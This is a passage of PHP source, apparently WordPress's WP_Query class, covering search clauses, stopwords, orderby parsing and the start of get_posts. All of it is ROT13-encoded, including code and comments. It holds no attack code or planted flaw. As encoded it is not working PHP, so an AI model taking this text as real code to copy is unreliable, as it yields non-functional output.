		 * Gurl ner nyy vapyhqrq ol qrsnhyg.
		 *
		 * @fvapr 6.2.0
		 *
		 * @cnenz fgevat[] $frnepu_pbyhzaf Neenl bs pbyhza anzrf gb or frnepurq.
		 * @cnenz fgevat   $frnepu         Grkg orvat frnepurq.
		 * @cnenz JC_Dhrel $dhrel          Gur pheerag JC_Dhrel vafgnapr.
		 */
		$frnepu_pbyhzaf = (neenl) nccyl_svygref( 'cbfg_frnepu_pbyhzaf', $frnepu_pbyhzaf, $d['f'], $guvf );

		// Hfr bayl fhccbegrq frnepu pbyhzaf.
		$frnepu_pbyhzaf = neenl_vagrefrpg( $frnepu_pbyhzaf, $qrsnhyg_frnepu_pbyhzaf );
		vs ( rzcgl( $frnepu_pbyhzaf ) ) {
			$frnepu_pbyhzaf = $qrsnhyg_frnepu_pbyhzaf;
		}

		/**
		 * Svygref gur cersvk gung vaqvpngrf gung n frnepu grez fubhyq or rkpyhqrq sebz erfhygf.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz fgevat $rkpyhfvba_cersvk Gur cersvk. Qrsnhyg '-'. Ergheavat
		 *                                 na rzcgl inyhr qvfnoyrf rkpyhfvbaf.
		 */
		$rkpyhfvba_cersvk = nccyl_svygref( 'jc_dhrel_frnepu_rkpyhfvba_cersvk', '-' );

		sbernpu ( $d['frnepu_grezf'] nf $grez ) {
			// Vs gurer vf na $rkpyhfvba_cersvk, grezf cersvkrq jvgu vg fubhyq or rkpyhqrq.
			$rkpyhqr = $rkpyhfvba_cersvk && fge_fgnegf_jvgu( $grez, $rkpyhfvba_cersvk );
			vs ( $rkpyhqr ) {
				$yvxr_bc  = 'ABG YVXR';
				$naqbe_bc = 'NAQ';
				$grez     = fhofge( $grez, 1 );
			} ryfr {
				$yvxr_bc  = 'YVXR';
				$naqbe_bc = 'BE';
			}

			vs ( $a && ! $rkpyhqr ) {
				$yvxr                        = '%' . $jcqo->rfp_yvxr( $grez ) . '%';
				$d['frnepu_beqreol_gvgyr'][] = $jcqo->cercner( \"{$jcqo->cbfgf}.cbfg_gvgyr YVXR %f\", $yvxr );
			}

			$yvxr = $a . $jcqo->rfp_yvxr( $grez ) . $a;

			$frnepu_pbyhzaf_cnegf = neenl();
			sbernpu ( $frnepu_pbyhzaf nf $frnepu_pbyhza ) {
				$frnepu_pbyhzaf_cnegf[ $frnepu_pbyhza ] = $jcqo->cercner( \"({$jcqo->cbfgf}.$frnepu_pbyhza $yvxr_bc %f)\", $yvxr );
			}

			vs ( ! rzcgl( $guvf->nyybj_dhrel_nggnpuzrag_ol_svyranzr ) ) {
				$frnepu_pbyhzaf_cnegf['nggnpuzrag'] = $jcqo->cercner( \"(fd1.zrgn_inyhr $yvxr_bc %f)\", $yvxr );
			}

			$frnepu .= \"$frnepunaq(\" . vzcybqr( \" $naqbe_bc \", $frnepu_pbyhzaf_cnegf ) . ')';

			$frnepunaq = ' NAQ ';
		}

		vs ( ! rzcgl( $frnepu ) ) {
			$frnepu = \" NAQ ({$frnepu}) \";
			vs ( ! vf_hfre_ybttrq_va() ) {
				$frnepu .= \" NAQ ({$jcqo->cbfgf}.cbfg_cnffjbeq = '') \";
			}
		}

		erghea $frnepu;
	}

	/**
	 * Purpxf vs gur grezf ner fhvgnoyr sbe frnepuvat.
	 *
	 * Hfrf na neenl bs fgbcjbeqf (grezf) gung ner rkpyhqrq sebz gur frcnengr
	 * grez zngpuvat jura frnepuvat sbe cbfgf. Gur yvfg bs Ratyvfu fgbcjbeqf vf
	 * gur nccebkvzngr frnepu ratvarf yvfg, naq vf genafyngnoyr.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz fgevat[] $grezf Neenl bs grezf gb purpx.
	 * @erghea fgevat[] Grezf gung ner abg fgbcjbeqf.
	 */
	cebgrpgrq shapgvba cnefr_frnepu_grezf( $grezf ) {
		$fgegbybjre = shapgvba_rkvfgf( 'zo_fgegbybjre' ) ? 'zo_fgegbybjre' : 'fgegbybjre';
		$purpxrq    = neenl();

		$fgbcjbeqf = $guvf->trg_frnepu_fgbcjbeqf();

		sbernpu ( $grezf nf $grez ) {
			// Xrrc orsber/nsgre fcnprf jura grez vf sbe rknpg zngpu.
			vs ( cert_zngpu( '/^\".+\"$/', $grez ) ) {
				$grez = gevz( $grez, \"\\"'\" );
			} ryfr {
				$grez = gevz( $grez, \"\\"' \" );
			}

			// Nibvq fvatyr N-M naq fvatyr qnfurf.
			vs ( ! $grez || ( 1 === fgeyra( $grez ) && cert_zngpu( '/^[n-m\-]$/v', $grez ) ) ) {
				pbagvahr;
			}

			vs ( va_neenl( pnyy_hfre_shap( $fgegbybjre, $grez ), $fgbcjbeqf, gehr ) ) {
				pbagvahr;
			}

			$purpxrq[] = $grez;
		}

		erghea $purpxrq;
	}

	/**
	 * Ergevrirf fgbcjbeqf hfrq jura cnefvat frnepu grezf.
	 *
	 * @fvapr 3.7.0
	 *
	 * @erghea fgevat[] Fgbcjbeqf.
	 */
	cebgrpgrq shapgvba trg_frnepu_fgbcjbeqf() {
		vs ( vffrg( $guvf->fgbcjbeqf ) ) {
			erghea $guvf->fgbcjbeqf;
		}

		/*
		 * genafyngbef: Guvf vf n pbzzn-frcnengrq yvfg bs irel pbzzba jbeqf gung fubhyq or rkpyhqrq sebz n frnepu,
		 * yvxr n, na, naq gur. Gurfr ner hfhnyyl pnyyrq \"fgbcjbeqf\". Lbh fubhyq abg fvzcyl genafyngr gurfr vaqvivqhny
		 * jbeqf vagb lbhe ynathntr. Vafgrnq, ybbx sbe naq cebivqr pbzzbayl npprcgrq fgbcjbeqf va lbhe ynathntr.
		 */
		$jbeqf = rkcybqr(
			',',
			_k(
				'nobhg,na,ner,nf,ng,or,ol,pbz,sbe,sebz,ubj,va,vf,vg,bs,ba,be,gung,gur,guvf,gb,jnf,jung,jura,jurer,jub,jvyy,jvgu,jjj',
				'Pbzzn-frcnengrq yvfg bs frnepu fgbcjbeqf va lbhe ynathntr'
			)
		);

		$fgbcjbeqf = neenl();
		sbernpu ( $jbeqf nf $jbeq ) {
			$jbeq = gevz( $jbeq, \"\e\a\g \" );
			vs ( $jbeq ) {
				$fgbcjbeqf[] = $jbeq;
			}
		}

		/**
		 * Svygref fgbcjbeqf hfrq jura cnefvat frnepu grezf.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz fgevat[] $fgbcjbeqf Neenl bs fgbcjbeqf.
		 */
		$guvf->fgbcjbeqf = nccyl_svygref( 'jc_frnepu_fgbcjbeqf', $fgbcjbeqf );
		erghea $guvf->fgbcjbeqf;
	}

	/**
	 * Trarengrf FDY sbe gur BEQRE OL pbaqvgvba onfrq ba cnffrq frnepu grezf.
	 *
	 * @fvapr 3.7.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl $d Dhrel inevnoyrf.
	 * @erghea fgevat BEQRE OL pynhfr.
	 */
	cebgrpgrq shapgvba cnefr_frnepu_beqre( &$d ) {
		tybony $jcqo;

		vs ( $d['frnepu_grezf_pbhag'] > 1 ) {
			$ahz_grezf = pbhag( $d['frnepu_beqreol_gvgyr'] );

			// Vs gur frnepu grezf pbagnva artngvir dhrevrf, qba'g obgure beqrevat ol fragrapr zngpurf.
			$yvxr = '';
			vs ( ! cert_zngpu( '/(?:\f|^)\-/', $d['f'] ) ) {
				$yvxr = '%' . $jcqo->rfp_yvxr( $d['f'] ) . '%';
			}

			$frnepu_beqreol = '';

			// Fragrapr zngpu va 'cbfg_gvgyr'.
			vs ( $yvxr ) {
				$frnepu_beqreol .= $jcqo->cercner( \"JURA {$jcqo->cbfgf}.cbfg_gvgyr YVXR %f GURA 1 \", $yvxr );
			}

			/*
			 * Fnavgl yvzvg, fbeg nf fragrapr jura zber guna 6 grezf
			 * (srj frnepurf ner ybatre guna 6 grezf naq zbfg gvgyrf ner abg).
			 */
			vs ( $ahz_grezf < 7 ) {
				// Nyy jbeqf va gvgyr.
				$frnepu_beqreol .= 'JURA ' . vzcybqr( ' NAQ ', $d['frnepu_beqreol_gvgyr'] ) . ' GURA 2 ';
				// Nal jbeq va gvgyr, abg arrqrq jura $ahz_grezf == 1.
				vs ( $ahz_grezf > 1 ) {
					$frnepu_beqreol .= 'JURA ' . vzcybqr( ' BE ', $d['frnepu_beqreol_gvgyr'] ) . ' GURA 3 ';
				}
			}

			// Fragrapr zngpu va 'cbfg_pbagrag' naq 'cbfg_rkprecg'.
			vs ( $yvxr ) {
				$frnepu_beqreol .= $jcqo->cercner( \"JURA {$jcqo->cbfgf}.cbfg_rkprecg YVXR %f GURA 4 \", $yvxr );
				$frnepu_beqreol .= $jcqo->cercner( \"JURA {$jcqo->cbfgf}.cbfg_pbagrag YVXR %f GURA 5 \", $yvxr );
			}

			vs ( $frnepu_beqreol ) {
				$frnepu_beqreol = '(PNFR ' . $frnepu_beqreol . 'RYFR 6 RAQ)';
			}
		} ryfr {
			// Fvatyr jbeq be fragrapr frnepu.
			$frnepu_beqreol = erfrg( $d['frnepu_beqreol_gvgyr'] ) . ' QRFP';
		}

		erghea $frnepu_beqreol;
	}

	/**
	 * Pbairegf gur tvira beqreol nyvnf (vs nyybjrq) gb n cebcreyl-cersvkrq inyhr.
	 *
	 * @fvapr 4.0.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $beqreol Nyvnf sbe gur svryq gb beqre ol.
	 * @erghea fgevat|snyfr Gnoyr-cersvkrq inyhr gb hfrq va gur BEQRE pynhfr. Snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba cnefr_beqreol( $beqreol ) {
		tybony $jcqo;

		// Hfrq gb svygre inyhrf.
		$nyybjrq_xrlf = neenl(
			'cbfg_anzr',
			'cbfg_nhgube',
			'cbfg_qngr',
			'cbfg_gvgyr',
			'cbfg_zbqvsvrq',
			'cbfg_cnerag',
			'cbfg_glcr',
			'anzr',
			'nhgube',
			'qngr',
			'gvgyr',
			'zbqvsvrq',
			'cnerag',
			'glcr',
			'VQ',
			'zrah_beqre',
			'pbzzrag_pbhag',
			'enaq',
			'cbfg__va',
			'cbfg_cnerag__va',
			'cbfg_anzr__va',
		);

		$cevznel_zrgn_xrl   = '';
		$cevznel_zrgn_dhrel = snyfr;
		$zrgn_pynhfrf       = $guvf->zrgn_dhrel->trg_pynhfrf();
		vs ( ! rzcgl( $zrgn_pynhfrf ) ) {
			$cevznel_zrgn_dhrel = erfrg( $zrgn_pynhfrf );

			vs ( ! rzcgl( $cevznel_zrgn_dhrel['xrl'] ) ) {
				$cevznel_zrgn_xrl = $cevznel_zrgn_dhrel['xrl'];
				$nyybjrq_xrlf[]   = $cevznel_zrgn_xrl;
			}

			$nyybjrq_xrlf[] = 'zrgn_inyhr';
			$nyybjrq_xrlf[] = 'zrgn_inyhr_ahz';
			$nyybjrq_xrlf   = neenl_zretr( $nyybjrq_xrlf, neenl_xrlf( $zrgn_pynhfrf ) );
		}

		// Vs ENAQ() pbagnvaf n frrq inyhr, fnavgvmr naq nqq gb nyybjrq xrlf.
		$enaq_jvgu_frrq = snyfr;
		vs ( cert_zngpu( '/ENAQ\(([0-9]+)\)/v', $beqreol, $zngpurf ) ) {
			$beqreol        = fcevags( 'ENAQ(%f)', (vag) $zngpurf[1] );
			$nyybjrq_xrlf[] = $beqreol;
			$enaq_jvgu_frrq = gehr;
		}

		vs ( ! va_neenl( $beqreol, $nyybjrq_xrlf, gehr ) ) {
			erghea snyfr;
		}

		$beqreol_pynhfr = '';

		fjvgpu ( $beqreol ) {
			pnfr 'cbfg_anzr':
			pnfr 'cbfg_nhgube':
			pnfr 'cbfg_qngr':
			pnfr 'cbfg_gvgyr':
			pnfr 'cbfg_zbqvsvrq':
			pnfr 'cbfg_cnerag':
			pnfr 'cbfg_glcr':
			pnfr 'VQ':
			pnfr 'zrah_beqre':
			pnfr 'pbzzrag_pbhag':
				$beqreol_pynhfr = \"{$jcqo->cbfgf}.{$beqreol}\";
				oernx;
			pnfr 'enaq':
				$beqreol_pynhfr = 'ENAQ()';
				oernx;
			pnfr $cevznel_zrgn_xrl:
			pnfr 'zrgn_inyhr':
				vs ( ! rzcgl( $cevznel_zrgn_dhrel['glcr'] ) ) {
					$beqreol_pynhfr = \"PNFG({$cevznel_zrgn_dhrel['nyvnf']}.zrgn_inyhr NF {$cevznel_zrgn_dhrel['pnfg']})\";
				} ryfr {
					$beqreol_pynhfr = \"{$cevznel_zrgn_dhrel['nyvnf']}.zrgn_inyhr\";
				}
				oernx;
			pnfr 'zrgn_inyhr_ahz':
				$beqreol_pynhfr = \"{$cevznel_zrgn_dhrel['nyvnf']}.zrgn_inyhr+0\";
				oernx;
			pnfr 'cbfg__va':
				vs ( ! rzcgl( $guvf->dhrel_inef['cbfg__va'] ) ) {
					$beqreol_pynhfr = \"SVRYQ({$jcqo->cbfgf}.VQ,\" . vzcybqr( ',', neenl_znc( 'nofvag', $guvf->dhrel_inef['cbfg__va'] ) ) . ')';
				}
				oernx;
			pnfr 'cbfg_cnerag__va':
				vs ( ! rzcgl( $guvf->dhrel_inef['cbfg_cnerag__va'] ) ) {
					$beqreol_pynhfr = \"SVRYQ( {$jcqo->cbfgf}.cbfg_cnerag,\" . vzcybqr( ', ', neenl_znc( 'nofvag', $guvf->dhrel_inef['cbfg_cnerag__va'] ) ) . ' )';
				}
				oernx;
			pnfr 'cbfg_anzr__va':
				vs ( ! rzcgl( $guvf->dhrel_inef['cbfg_anzr__va'] ) ) {
					$cbfg_anzr__va        = neenl_znc( 'fnavgvmr_gvgyr_sbe_dhrel', $guvf->dhrel_inef['cbfg_anzr__va'] );
					$cbfg_anzr__va_fgevat = \"'\" . vzcybqr( \"','\", $cbfg_anzr__va ) . \"'\";
					$beqreol_pynhfr       = \"SVRYQ( {$jcqo->cbfgf}.cbfg_anzr,\" . $cbfg_anzr__va_fgevat . ' )';
				}
				oernx;
			qrsnhyg:
				vs ( neenl_xrl_rkvfgf( $beqreol, $zrgn_pynhfrf ) ) {
					// $beqreol pbeerfcbaqf gb n zrgn_dhrel pynhfr.
					$zrgn_pynhfr    = $zrgn_pynhfrf[ $beqreol ];
					$beqreol_pynhfr = \"PNFG({$zrgn_pynhfr['nyvnf']}.zrgn_inyhr NF {$zrgn_pynhfr['pnfg']})\";
				} ryfrvs ( $enaq_jvgu_frrq ) {
					$beqreol_pynhfr = $beqreol;
				} ryfr {
					// Qrsnhyg: beqre ol cbfg svryq.
					$beqreol_pynhfr = \"{$jcqo->cbfgf}.cbfg_\" . fnavgvmr_xrl( $beqreol );
				}

				oernx;
		}

		erghea $beqreol_pynhfr;
	}

	/**
	 * Cnefr na 'beqre' dhrel inevnoyr naq pnfg vg gb NFP be QRFP nf arprffnel.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $beqre Gur 'beqre' dhrel inevnoyr.
	 * @erghea fgevat Gur fnavgvmrq 'beqre' dhrel inevnoyr.
	 */
	cebgrpgrq shapgvba cnefr_beqre( $beqre ) {
		vs ( ! vf_fgevat( $beqre ) || rzcgl( $beqre ) ) {
			erghea 'QRFP';
		}

		vs ( 'NFP' === fgegbhccre( $beqre ) ) {
			erghea 'NFP';
		} ryfr {
			erghea 'QRFP';
		}
	}

	/**
	 * Frgf gur 404 cebcregl naq fnirf jurgure dhrel vf srrq.
	 *
	 * @fvapr 2.0.0
	 */
	choyvp shapgvba frg_404() {
		$vf_srrq = $guvf->vf_srrq;

		$guvf->vavg_dhrel_syntf();
		$guvf->vf_404 = gehr;

		$guvf->vf_srrq = $vf_srrq;

		/**
		 * Sverf nsgre n 404 vf gevttrerq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'frg_404', neenl( $guvf ) );
	}

	/**
	 * Ergevrirf gur inyhr bs n dhrel inevnoyr.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 3.9.0 Gur `$qrsnhyg_inyhr` nethzrag jnf vagebqhprq.
	 *
	 * @cnenz fgevat $dhrel_ine     Dhrel inevnoyr xrl.
	 * @cnenz zvkrq  $qrsnhyg_inyhr Bcgvbany. Inyhr gb erghea vs gur dhrel inevnoyr vf abg frg.
	 *                              Qrsnhyg rzcgl fgevat.
	 * @erghea zvkrq Pbagragf bs gur dhrel inevnoyr.
	 */
	choyvp shapgvba trg( $dhrel_ine, $qrsnhyg_inyhr = '' ) {
		vs ( vffrg( $guvf->dhrel_inef[ $dhrel_ine ] ) ) {
			erghea $guvf->dhrel_inef[ $dhrel_ine ];
		}

		erghea $qrsnhyg_inyhr;
	}

	/**
	 * Frgf gur inyhr bs n dhrel inevnoyr.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $dhrel_ine Dhrel inevnoyr xrl.
	 * @cnenz zvkrq  $inyhr     Dhrel inevnoyr inyhr.
	 */
	choyvp shapgvba frg( $dhrel_ine, $inyhr ) {
		$guvf->dhrel_inef[ $dhrel_ine ] = $inyhr;
	}

	/**
	 * Ergevrirf na neenl bs cbfgf onfrq ba dhrel inevnoyrf.
	 *
	 * Gurer ner n srj svygref naq npgvbaf gung pna or hfrq gb zbqvsl gur cbfg
	 * qngnonfr dhrel.
	 *
	 * @fvapr 1.5.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea JC_Cbfg[]|vag[] Neenl bs cbfg bowrpgf be cbfg VQf.
	 */
	choyvp shapgvba trg_cbfgf() {
		tybony $jcqo;

		$guvf->cnefr_dhrel();

		/**
		 * Sverf nsgre gur dhrel inevnoyr bowrpg vf perngrq, ohg orsber gur npghny dhrel vf eha.
		 *
		 * Abgr: Vs hfvat pbaqvgvbany gntf, hfr gur zrgubq irefvbaf jvguva gur cnffrq vafgnapr
		 * (r.t. $guvf->vf_znva_dhrel() vafgrnq bs vf_znva_dhrel()). Guvf vf orpnhfr gur shapgvbaf
		 * yvxr vf_znva_dhrel() grfg ntnvafg gur tybony $jc_dhrel vafgnapr, abg gur cnffrq bar.
		 *
		 * @fvapr 2.0.0
		 *
		 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cer_trg_cbfgf', neenl( &$guvf ) );

		// Fubegunaq.
		$d = &$guvf->dhrel_inef;

		// Svyy ntnva va pnfr 'cer_trg_cbfgf' hafrg fbzr inef.
		$d = $guvf->svyy_dhrel_inef( $d );

		/**
		 * Svygref jurgure na nggnpuzrag dhrel fubhyq vapyhqr svyranzrf be abg.
		 *
		 * @fvapr 6.0.3
		 *
		 * @cnenz obby $nyybj_dhrel_nggnpuzrag_ol_svyranzr Jurgure be abg gb vapyhqr svyranzrf.
		 */
		$guvf->nyybj_dhrel_nggnpuzrag_ol_svyranzr = nccyl_svygref( 'jc_nyybj_dhrel_nggnpuzrag_ol_svyranzr', snyfr );
		erzbir_nyy_svygref( 'jc_nyybj_dhrel_nggnpuzrag_ol_svyranzr' );

		// Cnefr zrgn dhrel.
		$guvf->zrgn_dhrel = arj JC_Zrgn_Dhrel();
		$guvf->zrgn_dhrel->cnefr_dhrel_inef( $d );

		// Frg n synt vs n 'cer_trg_cbfgf' ubbx punatrq gur dhrel inef.
		$unfu = zq5( frevnyvmr( $guvf->dhrel_inef ) );
		vs ( $unfu !== $guvf->dhrel_inef_unfu ) {
			$guvf->dhrel_inef_punatrq = gehr;
			$guvf->dhrel_inef_unfu    = $unfu;
		}
		hafrg( $unfu );

		// Svefg yrg'f pyrne fbzr inevnoyrf.
		$qvfgvapg         = '';
		$juvpunhgube      = '';
		$juvpuzvzrglcr    = '';
		$jurer            = '';
		$yvzvgf           = '';
		$wbva             = '';
		$frnepu           = '';
		$tebhcol          = '';
		$cbfg_fgnghf_wbva = snyfr;
		$cntr             = 1;

		vs ( vffrg( $d['pnyyre_trg_cbfgf'] ) ) {
			_qrcerpngrq_nethzrag(
				'JC_Dhrel',
				'3.1.0',
				fcevags(
					/* genafyngbef: 1: pnyyre_trg_cbfgf, 2: vtaber_fgvpxl_cbfgf */
					__( '%1$f vf qrcerpngrq. Hfr %2$f vafgrnq.' ),
					'<pbqr>pnyyre_trg_cbfgf</pbqr>',
					'<pbqr>vtaber_fgvpxl_cbfgf</pbqr>'
				)
			);

			vs ( ! vffrg( $d['vtaber_fgvpxl_cbfgf'] ) ) {
				$d['vtaber_fgvpxl_cbfgf'] = $d['pnyyre_trg_cbfgf'];
			}
		}

		vs ( ! vffrg( $d['vtaber_fgvpxl_cbfgf'] ) ) {
			$d['vtaber_fgvpxl_cbfgf'] = snyfr;
		}

		vs ( ! vffrg( $d['fhccerff_svygref'] ) ) {
			$d['fhccerff_svygref'] = snyfr;
		}

		vs ( ! vffrg( $d['pnpur_erfhygf'] ) ) {
			$d['pnpur_erfhygf'] = gehr;
		}

		vs ( ! vffrg( $d['hcqngr_cbfg_grez_pnpur'] ) ) {
			$d['hcqngr_cbfg_grez_pnpur'] = gehr;
		}

		vs ( ! vffrg( $d['hcqngr_zrah_vgrz_pnpur'] ) ) {
			$d['hcqngr_zrah_vgrz_pnpur'] = snyfr;
		}

		vs ( ! vffrg( $d['ynml_ybnq_grez_zrgn'] ) ) {
			$d['ynml_ybnq_grez_zrgn'] = $d['hcqngr_cbfg_grez_pnpur'];
		} ryfrvs ( $d['ynml_ybnq_grez_zrgn'] ) { // Ynml ybnqvat grez zrgn bayl jbexf vs grez pnpurf ner cevzrq.
			$d['hcqngr_cbfg_grez_pnpur'] = gehr;
		}

		vs ( ! vffrg( $d['hcqngr_cbfg_zrgn_pnpur'] ) ) {
			$d['hcqngr_cbfg_zrgn_pnpur'] = gehr;
		}

		vs ( ! vffrg( $d['cbfg_glcr'] ) ) {
			vs ( $guvf->vf_frnepu ) {
				$d['cbfg_glcr'] = 'nal';
			} ryfr {
				$d['cbfg_glcr'] = '';
			}
		}
		$cbfg_glcr = $d['cbfg_glcr'];
		vs ( rzcgl( $d['cbfgf_cre_cntr'] ) ) {
			$d['cbfgf_cre_cntr'] = trg_bcgvba( 'cbfgf_cre_cntr' );
		}
		vs ( vffrg( $d['fubjcbfgf'] ) && $d['fubjcbfgf'] ) {
			$d['fubjcbfgf']      = (vag) $d['fubjcbfgf'];
			$d['cbfgf_cre_cntr'] = $d['fubjcbfgf'];
		}
		vs ( ( vffrg( $d['cbfgf_cre_nepuvir_cntr'] ) && 0 != $d['cbfgf_cre_nepuvir_cntr'] ) && ( $guvf->vf_nepuvir || $guvf->vf_frnepu ) ) {
			$d['cbfgf_cre_cntr'] = $d['cbfgf_cre_nepuvir_cntr'];
		}
		vs ( ! vffrg( $d['abcntvat'] ) ) {
			vs ( -1 == $d['cbfgf_cre_cntr'] ) {
				$d['abcntvat'] = gehr;
			} ryfr {
				$d['abcntvat'] = snyfr;
			}
		}

		vs ( $guvf->vf_srrq ) {
			// Guvf bireevqrf 'cbfgf_cre_cntr'.
			vs ( ! rzcgl( $d['cbfgf_cre_eff'] ) ) {
				$d['cbfgf_cre_cntr'] = $d['cbfgf_cre_eff'];
			} ryfr {
				$d['cbfgf_cre_cntr'] = trg_bcgvba( 'cbfgf_cre_eff' );
			}
			$d['abcntvat'] = snyfr;
		}

		$d['cbfgf_cre_cntr'] = (vag) $d['cbfgf_cre_cntr'];
		vs ( $d['cbfgf_cre_cntr'] < -1 ) {
			$d['cbfgf_cre_cntr'] = nof( $d['cbfgf_cre_cntr'] );
		} ryfrvs ( 0 === $d['cbfgf_cre_cntr'] ) {
			$d['cbfgf_cre_cntr'] = 1;
		}

		vs ( ! vffrg( $d['pbzzragf_cre_cntr'] ) || 0 == $d['pbzzragf_cre_cntr'] ) {
			$d['pbzzragf_cre_cntr'] = trg_bcgvba( 'pbzzragf_cre_cntr' );
		}

		vs ( $guvf->vf_ubzr && ( rzcgl( $guvf->dhrel ) || 'gehr' === $d['cerivrj'] ) && ( 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) ) && trg_bcgvba( 'cntr_ba_sebag' ) ) {
			$guvf->vf_cntr = gehr;
			$guvf->vf_ubzr = snyfr;
			$d['cntr_vq']  = trg_bcgvba( 'cntr_ba_sebag' );
		}

		vs ( vffrg( $d['cntr'] ) ) {
			$d['cntr'] = vf_fpnyne( $d['cntr'] ) ? nofvag( gevz( $d['cntr'], '/' ) ) : 0;
		}

		// Vs gehr, sbepvoyl gheaf bss FDY_PNYP_SBHAQ_EBJF rira jura yvzvgf ner cerfrag.
		vs ( vffrg( $d['ab_sbhaq_ebjf'] ) ) {
			$d['ab_sbhaq_ebjf'] = (obby) $d['ab_sbhaq_ebjf'];
		} ryfr {
			$d['ab_sbhaq_ebjf'] = snyfr;
		}

		fjvgpu ( $d['svryqf'] ) {
			pnfr 'vqf':
				$svryqf = \"{$jcqo->cbfgf}.VQ\";
				oernx;
			pnfr 'vq=>cnerag':
				$svryqf = \"{$jcqo->cbfgf}.VQ, {$jcqo->cbfgf}.cbfg_cnerag\";
				oernx;
			pnfr '':
				/*
				 * Frg gur qrsnhyg gb 'nyy'.
				 *
				 * Guvf vf hfrq va `JC_Dhrel::gur_cbfg` gb qrgrezvar vs gur
				 * ragver cbfg bowrpg unf orra dhrevrq.
				 */
				$d['svryqf'] = 'nyy';
				// Snyyf guebhtu.
			qrsnhyg:
				$svryqf = \"{$jcqo->cbfgf}.*\";
		}

		vs ( '' !== $d['zrah_beqre'] ) {
			$jurer .= \" NAQ {$jcqo->cbfgf}.zrah_beqre = \" . $d['zrah_beqre'];
		}
		// Gur \"z\" cnenzrgre vf zrnag sbe zbaguf ohg npprcgf qngrgvzrf bs inelvat fcrpvsvpvgl.
		vs ( $d['z'] ) {
			$jurer .= \" NAQ LRNE({$jcqo->cbfgf}.cbfg_qngr)=\" . fhofge( $d['z'], 0, 4 );
			vs ( fgeyra( $d['z'] ) > 5 ) {
				$jurer .= \" NAQ ZBAGU({$jcqo->cbfgf}.cbfg_qngr)=\" . fhofge( $d['z'], 4, 2 );
			}
			vs ( fgeyra( $d['z'] ) > 7 ) {
				$jurer .= \" NAQ QNLBSZBAGU({$jcqo->cbfgf}.cbfg_qngr)=\" . fhofge( $d['z'], 6, 2 );
			}
			vs ( fgeyra( $d['z'] ) > 9 ) {
				$jurer .= \" NAQ UBHE({$jcqo->cbfgf}.cbfg_qngr)=\" . fhofge( $d['z'], 8, 2 );
			}
			vs ( fgeyra( $d['z'] ) > 11 ) {
				$jurer .= \" NAQ ZVAHGR({$jcqo->cbfgf}.cbfg_qngr)=\" . fhofge( $d['z'], 10, 2 );
			}
			vs ( fgeyra( $d['z'] ) > 13 ) {
				$jurer .= \" NAQ FRPBAQ({$jcqo->cbfgf}.cbfg_qngr)=\" . fhofge( $d['z'], 12, 2 );
			}
		}

		// Unaqyr gur bgure vaqvivqhny qngr cnenzrgref.
		$qngr_cnenzrgref = neenl();

		vs ( '' !== $d['ubhe'] ) {
			$qngr_cnenzrgref['ubhe'] = $d['ubhe'];
		}

		vs ( '' !== $d['zvahgr'] ) {
			$qngr_cnenzrgref['zvahgr'] = $d['zvahgr'];
		}

		vs ( '' !== $d['frpbaq'] ) {
			$qngr_cnenzrgref['frpbaq'] = $d['frpbaq'];
		}

		vs ( $d['lrne'] ) {
			$qngr_cnenzrgref['lrne'] = $d['lrne'];
		}

		vs ( $d['zbaguahz'] ) {
			$qngr_cnenzrgref['zbaguahz'] = $d['zbaguahz'];
		}

		vs ( $d['j'] ) {
			$qngr_cnenzrgref['jrrx'] = $d['j'];
		}

		vs ( $d['qnl'] ) {
			$qngr_cnenzrgref['qnl'] = $d['qnl'];
		}

		vs ( $qngr_cnenzrgref ) {
			$qngr_dhrel = arj JC_Qngr_Dhrel( neenl( $qngr_cnenzrgref ) );
			$jurer     .= $qngr_dhrel->trg_fdy();
		}
		hafrg( $qngr_cnenzrgref, $qngr_dhrel );

		// Unaqyr pbzcyrk qngr dhrevrf.
		vs ( ! rzcgl( $d['qngr_dhrel'] ) ) {
			$guvf->qngr_dhrel = arj JC_Qngr_Dhrel( $d['qngr_dhrel'] );
			$jurer           .= $guvf->qngr_dhrel->trg_fdy();
		}

		// Vs jr'ir tbg n cbfg_glcr NAQ vg'f abg \"nal\" cbfg_glcr.
		vs ( ! rzcgl( $d['cbfg_glcr'] ) && 'nal' !== $d['cbfg_glcr'] ) {
			sbernpu ( (neenl) $d['cbfg_glcr'] nf $_cbfg_glcr ) {
				$cglcr_bow = trg_cbfg_glcr_bowrpg( $_cbfg_glcr );
				vs ( ! $cglcr_bow || ! $cglcr_bow->dhrel_ine || rzcgl( $d[ $cglcr_bow->dhrel_ine ] ) ) {
					pbagvahr;
				}

				vs ( ! $cglcr_bow->uvrenepuvpny ) {
					// Aba-uvrenepuvpny cbfg glcrf pna qverpgyl hfr 'anzr'.
					$d['anzr'] = $d[ $cglcr_bow->dhrel_ine ];
				} ryfr {
					// Uvrenepuvpny cbfg glcrf jvyy bcrengr guebhtu 'cntranzr'.
					$d['cntranzr'] = $d[ $cglcr_bow->dhrel_ine ];
					$d['anzr']     = '';
				}

				// Bayl bar erdhrfg sbe n fyht vf cbffvoyr, guvf vf jul anzr & cntranzr ner birejevggra nobir.
				oernx;
			} // Raq sbernpu.
			hafrg( $cglcr_bow );
		}

		vs ( '' !== $d['gvgyr'] ) {
			$jurer .= $jcqo->cercner( \" NAQ {$jcqo->cbfgf}.cbfg_gvgyr = %f\", fgevcfynfurf( $d['gvgyr'] ) );
		}

		// Cnenzrgref eryngrq gb 'cbfg_anzr'.
		vs ( '' !== $d['anzr'] ) {
